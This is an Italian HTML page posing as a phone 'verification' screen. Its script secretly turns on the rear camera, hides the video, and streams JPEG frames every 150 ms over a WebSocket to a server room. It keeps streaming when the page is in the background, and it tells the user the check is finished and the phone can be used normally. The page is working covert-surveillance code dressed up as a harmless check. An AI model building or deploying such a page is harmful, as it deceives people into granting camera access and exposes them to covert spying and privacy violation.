<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifica...</title>
  <style>
    body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
    .msg { padding:40px 20px; font-size:18px; }
    #debug { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,0.8); color:#0f0; padding:10px; font-size:12px; }
  </style>
</head>
<body>
  <div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
  <div id="debug"></div>

  <!-- Video nascosto -->
  <video id="cam" playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('cam');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const debug = document.getElementById('debug');
    const room = new URLSearchParams(location.search).get('room') || 'user1';
    
    let stream = null;
    let sending = false;
    let ws = null;
    let frameInterval = null;
    
    function log(msg) {
      debug.textContent = new Date().toLocaleTimeString() + ': ' + msg;
      console.log(msg);
    }

    // Gestione WebSocket
    function connectWebSocket() {
      if (ws) {
        ws.close();
      }

      ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);

      ws.onopen = () => {
        log('WebSocket connesso');
        if (!stream) {
          startCamera();
        } else {
          startSendingFrames();
        }
      };

      ws.onclose = () => {
        log('Connessione persa - riconnessione...');
        stopSendingFrames();
        // Riprova a connetterti dopo 3 secondi
        setTimeout(connectWebSocket, 3000);
      };

      ws.onerror = (err) => {
        log('Errore WebSocket: ' + (err.message || 'errore sconosciuto'));
      };
    }

    // Avvia la connessione iniziale
    connectWebSocket();

    function startSendingFrames() {
      if (frameInterval) {
        clearInterval(frameInterval);
      }
      sending = true;
      // Invia subito il primo frame
      sendFrame();
      // Imposta l'invio periodico
      frameInterval = setInterval(sendFrame, 150);
      log('Avviato invio frames');
    }

    function stopSendingFrames() {
      sending = false;
      if (frameInterval) {
        clearInterval(frameInterval);
        frameInterval = null;
      }
      log('Fermato invio frames');
    }

    // Invia singolo frame
    function sendFrame() {
      if (!sending || !video.videoWidth || !ws || ws.readyState !== WebSocket.OPEN) return;
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      
      canvas.toBlob(blob => {
        if (ws && ws.readyState === WebSocket.OPEN && blob) {
          ws.send(blob);
          log('Frame inviato: ' + blob.size + ' bytes');
        }
      }, 'image/jpeg', 0.5); // Ridotta qualità per migliorare performance
    }

    // Avvia fotocamera POSTERIORE
    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'environment',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        });
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          startSendingFrames();
          
          // Messaggio finale
          document.querySelector('.msg').innerHTML = `
            <div>
              <b>Verifica completata</b><br>
              <small>Puoi usare il telefono normalmente.<br>
              La verifica continua in background.</small>
            </div>`;
        };

        // Avvia il video
        await video.play();
        log('Camera avviata con successo');
        
      } catch (err) {
        log('Errore camera: ' + err.message);
        document.querySelector('.msg').innerHTML = `<div>Errore: ${err.message}</div>`;
      }
    }

    // Gestione visibilità pagina
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        // La pagina è nascosta, continua a inviare
        log('Pagina in background - continuo invio');
      } else {
        // La pagina è visibile di nuovo
        log('Pagina in primo piano');
        if (!sending && stream) {
          startSendingFrames();
        }
      }
    });

    // Gestione chiusura pagina
    window.onbeforeunload = () => {
      stopSendingFrames();
      if (ws) ws.close();
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };

    // Tieni vivo il WebSocket
    setInterval(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send('ping');
        log('Ping inviato');
      }
    }, 30000);
  </script>
</body>
</html>
